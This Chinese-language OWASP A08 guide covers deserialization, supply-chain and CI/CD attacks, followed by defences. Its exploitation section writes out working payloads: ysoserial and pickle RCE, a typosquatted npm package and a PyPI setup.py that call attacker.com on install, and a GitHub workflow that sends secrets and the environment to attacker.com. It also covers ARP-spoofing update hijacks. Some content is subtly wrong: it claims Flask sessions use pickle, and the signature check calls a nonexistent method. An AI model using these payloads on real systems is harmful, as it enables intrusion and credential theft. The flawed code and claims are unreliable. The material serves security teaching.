# 🔄 软件和数据完整性失效（A08: Software and Data Integrity Failures）全技巧

> **OWASP Top 10 2021 — 第8位**  
> 与无法保护完整性的软件和基础设施相关的漏洞，如不安全的反序列化、供应链攻击、CI/CD管道攻击等。

---

## 📋 一、漏洞基础

### 1.1 什么是完整性失效？

完整性失效指的是软件在**构建、更新或运行过程中**，未能验证数据或代码未被篡改，导致攻击者可注入恶意内容。

### 1.2 常见场景

| 场景 | 说明 | 示例 |
|------|------|------|
| 🚫 **不安全反序列化** | 反序列化未受信任数据 | PHP/Python/Java反序列化RCE |
| 🚫 **无签名校验** | 更新包无签名验证 | 中间人替换恶意更新 |
| 🚫 **CI/CD投毒** | 攻击CI/CD管道 | 注入恶意代码到构建流程 |
| 🚫 **不安全插件** | 安装未验证的插件/扩展 | VSCode/Chrome恶意扩展 |
| 🚫 **依赖完整性** | 使用篡改的依赖包 | 恶意npm包 |

### 1.3 危害

- 远程代码执行（RCE）
- 供应链污染攻击
- 木马/后门植入
- 数据篡改
- 软件供应链信任危机

---

## 🔍 二、基础检测技巧

### 2.1 反序列化检测

```bash
# Java反序列化检测
# 在HTTP请求中寻找Java序列化特征
# 特征：二进制数据以 \xac\xed\x00\x05（Java序列化魔术头）开头
# 或 base64/rO0AB/ 开头

# 检测 base64 编码的序列化数据
echo "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0" | base64 -d | xxd | head

# PHP反序列化检测
# 特征格式：O:4:"User":1:{s:4:"name";s:5:"admin";}
# 在参数、Cookie、Session中寻找
curl -s "https://target.com/?user=O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}"

# Python pickle反序列化
# 特征：python的pickle协议
# 在API请求、Redis缓存中寻找
```

### 2.2 更新机制检测

```bash
# 检查更新是否通过HTTP（不安全）
# 抓取更新请求
curl -s "http://update.target.com/software-update-1.2.3.exe" -o update.exe
# 如果通过HTTP传输，可做中间人攻击

# 检查更新包的签名
# 下载后检查是否有签名文件
curl -s "https://update.target.com/update-1.2.3.exe.asc"
# 如果没有签名文件，说明未签名

# 检查自动更新配置
curl -s https://target.com/update/check
# 查看响应中是否有 update_url, signature 等字段
```

### 2.3 CI/CD 配置检测

```bash
# 检查Jenkins是否暴露
curl -s https://jenkins.target.com/
# 如果有未授权访问

# 检查.gitlab-ci.yml / Jenkinsfile 是否暴露
curl -s https://target.com/.gitlab-ci.yml
curl -s https://target.com/Jenkinsfile

# 检查Dockerfile中的安全配置
curl -s https://target.com/Dockerfile | grep -i "curl\|wget\|pip\|npm"

# 检查Makefile中的安全缺陷
curl -s https://target.com/Makefile
```

---

## 🚀 三、进阶利用技巧

### 3.1 Java 反序列化 RCE

```bash
# Java 反序列化利用（ysoserial）
# 安装 ysoserial
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests

# 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# 发送 payload
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# 常见利用链
# CommonsCollections1-7 (Apache Commons Collections)
# Spring1/2 (Spring Framework)
# Jdk7u21 (JDK 7u21以下)
# JRMPClient (远程加载)

# URLDNS链 - 用于检测是否存在反序列化（无RCE，只触发DNS查询）
java -jar ysoserial.jar URLDNS "http://xxxx.burpcollaborator.net" > payload.bin
```

### 3.2 PHP 反序列化

```php
<?php
// PHP反序列化利用
// 假设有类：
class User {
    public $username;
    public $isAdmin;
    public $cmd;
    
    public function __destruct() {
        if ($this->isAdmin) {
            system($this->cmd);  // 危险！
        }
    }
}

// 构造payload
// $payload = serialize(new User());
// O:4:"User":3:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;s:3:"cmd";s:2:"id";}

// 利用 __wakeup() 绕过（CVE-2016-7124）
// 当序列化属性数量大于实际数量时，跳过 __wakeup()
// O:4:"User":4:{s:8:"username";s:5:"admin";...}  // count = 4 但实际只有3个属性

// 原生类利用
// 使用 GlobIterator 进行目录遍历
// $payload = 'O:12:"GlobIterator":1:{s:1:"/etc/*";}';
?>
```

### 3.3 Python Pickle 反序列化

```python
# Python pickle 反序列化 RCE
import pickle
import os

# 恶意类
class Evil(object):
    def __reduce__(self):
        # __reduce__ 返回 (callable, args)
        return (os.system, ('id',))

# 生成恶意 payload
payload = pickle.dumps(Evil())
print(payload.hex())

# Flask session 伪造（如果secret_key已知）
# Flask session 使用 pickle 序列化
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 如果有 secret_key，可伪造session
serializer = URLSafeTimedSerializer(
    'secret_key_here',
    salt='cookie-session',
    serializer=pickle
)
fake_session = {'user': 'admin', 'role': 'admin'}
forged_cookie = serializer.dumps(fake_session)
```

### 3.4 供应链攻击 - 依赖投毒

```json
// npm 包投毒攻击
// 1. 注册类似包名（typosquatting）
//    lodash → lodahs, lo_dash

// 2. 恶意包代码示例 (package.json)
{
  "name": "lodahs",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://attacker.com/steal?token=$(cat /etc/hostname)",
    "postinstall": "node malicious.js"
  }
}

// 3. 安装后自动执行（preinstall/postinstall hooks）
// 4. 等待开发者误装

// Python PyPI 投毒
// setup.py
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        import os
        os.system("curl http://attacker.com/beacon")
        install.run(self)

setup(
    name='pytorch-cpu',  // 类似pytorch的包名
    version='1.0.0',
    cmdclass={'install': PostInstallCommand},
)
```

### 3.5 CI/CD 管道攻击

```yaml
# 攻击场景：利用 CI/CD 环境变量泄露

# 如果攻击者能提交恶意 PR，在 CI 中执行
# .github/workflows/leak.yml
name: Leak Secrets
on: [pull_request]

jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "=== All Env Variables ==="
          env | grep -i "secret\|key\|token\|password"
          
          # 尝试访问云元数据
          curl -s http://169.254.169.254/latest/meta-data/
          curl -s http://169.254.169.254/latest/user-data/
          
          # 向攻击者发送
          curl -X POST http://attacker.com/steal \
            --data-urlencode "env=$(env)"
```

### 3.6 软件更新劫持

```bash
# 场景：软件通过HTTP下载更新（无签名验证）

# 1. ARP欺骗/MITM
arpspoof -i eth0 -t victim_ip gateway_ip

# 2. 替换更新文件
# 当 victim 请求 http://update.target.com/update.exe
# 返回恶意文件
mitmproxy --mode transparent --script swap_update.py

# 3. 用户无感知安装更新
# 如果更新无签名验证，恶意更新被安装

# 场景：更新机制中的路径遍历
# 如果更新解压时未检查路径
curl -X POST https://target.com/api/update \
  -F "file=@malicious.zip"
# zip文件中包含 ../../etc/cron.d/evil 实现任意文件写入
```

### 3.7 Hazelcast / Redis 反序列化

```bash
# Redis 未授权访问 + 反序列化
# 如果Redis未授权访问且使用了Java客户端

# 通过Redis设置反序列化payload
redis-cli -h target.com set key "\xac\xed\x00\x05..."  # Java序列化payload
redis-cli -h target.com get key  # 触发反序列化

# Hazelcast 反序列化
# Hazelcast 集群成员间通信使用Java序列化
# 如果可加入集群，发送恶意payload
```

---

## 🛡️ 四、防御方案

### 4.1 反序列化防御

```python
# Python - 安全反序列化
# 使用 json 替代 pickle
import json
data = json.loads(user_input)  # 安全

# 如果必须使用 pickle，使用限制性反序列化
import pickletools
import io

def safe_loads(data):
    """白名单方式反序列化"""
    allowed_ops = {
        'STOP', 'POP', 'POP_MARK', 'DUP', 'FLOAT', 'INT', 'BININT',
        'BINGET', 'UNICODE', 'SHORT_BINUNICODE',  # 只允许基本类型
    }
    
    # 使用 pickletools 反汇编检查
    for opcode, arg, pos in pickletools.genops(io.BytesIO(data)):
        if opcode.name not in allowed_ops:
            raise ValueError(f"禁止的操作码: {opcode.name}")
    
    return pickle.loads(data)
```

### 4.2 软件更新安全

```python
# 更新包签名验证
import hashlib
import requests

UPDATE_SERVER = "https://update.target.com"
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

def verify_update(version):
    """验证更新包的签名"""
    # 下载更新包
    update_data = requests.get(f"{UPDATE_SERVER}/update-{version}.bin").content
    
    # 下载签名
    signature = requests.get(f"{UPDATE_SERVER}/update-{version}.bin.sig").content
    
    # 验证签名
    from cryptography.hazmat.primitives import hashes, asymmetric
    from cryptography.hazmat.primitives.asymmetric import padding
    
    public_key = asymmetric.rsa.RSAPublicKey.from_pem(PUBLIC_KEY.encode())
    
    try:
        public_key.verify(
            signature,
            update_data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True, update_data
    except:
        return False, None
```

### 4.3 CI/CD 安全配置

```yaml
# GitHub Actions 安全最佳实践
name: Secure CI/CD

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    
    # 不要自动执行 PR 的 workflows（需审核）
    # pull_request_target 需特别小心
    
    steps:
      - uses: actions/checkout@v4
        with:
          # 不要使用 GITHUB_TOKEN 的自动认证
          persist-credentials: false
      
      # 只使用可信的第三方 actions
      - uses: actions/setup-node@v4
      
      # 锁定依赖版本（不是latest）
      - run: npm ci --only=production
      
      # 验证依赖完整性
      - run: npm audit
      
      # 构建
      - run: npm run build
      
      # 签名构建产物
      - name: Sign artifacts
        run: |
          gpg --batch --yes --detach-sign --armor dist/*
```

### 4.4 依赖完整性校验

```bash
# npm 包完整性校验
# package-lock.json 中的 integrity 字段
"lodash": {
  "version": "4.17.21",
  "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z..."
}

# 验证
npm install --ignore-scripts  # 不执行安装脚本
npm ci  # 使用 lock file 确保依赖版本一致

# Python pip 完整性
# 使用 hashes 文件
pip install --require-hashes -r requirements.txt

# requirements.txt 示例
# package==1.2.3 --hash=sha256:xxx...
```

### 4.5 安全开发生命周期

| 阶段 | 安全措施 |
|------|----------|
| 📝 设计 | 威胁建模、安全架构评审 |
| 💻 编码 | 安全编码规范、代码审查 |
| 🔄 依赖 | SBOM、依赖扫描、版本锁定 |
| 🏗️ 构建 | 可重现构建、签名构建产物 |
| 🧪 测试 | SAST/DAST扫描、渗透测试 |
| 🚀 发布 | 签名发布包、完整性校验 |
| 🔍 监控 | 异常检测、供应链监控 |

---

## 🎯 五、实战检查清单

### 5.1 渗透测试要点

- [ ] 是否存在反序列化端点？（Java/PHP/Python）
- [ ] 反序列化是否使用不安全的方法？
- [ ] 软件更新是否通过HTTPS传输？
- [ ] 更新包是否有签名验证？
- [ ] CI/CD管道是否有未授权访问？
- [ ] 是否存在依赖混淆风险？
- [ ] 插件/扩展是否经过安全验证？
- [ ] 构建产物是否签名？
- [ ] 是否有软件物料清单（SBOM）？

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| ysoserial | Java反序列化payload生成 |
| PHPGGC | PHP反序列化payload生成 |
| ysoserial.net | .NET反序列化 |
| pickora | Python pickle反序列化 |
| Dependency Check | 依赖漏洞扫描 |
| in-toto | 软件供应链安全框架 |

---

> **💡 核心原则**：永远不要反序列化未受信任的数据！签名验证所有更新和构建产物！软件供应链安全需要从源码到部署全程保护！
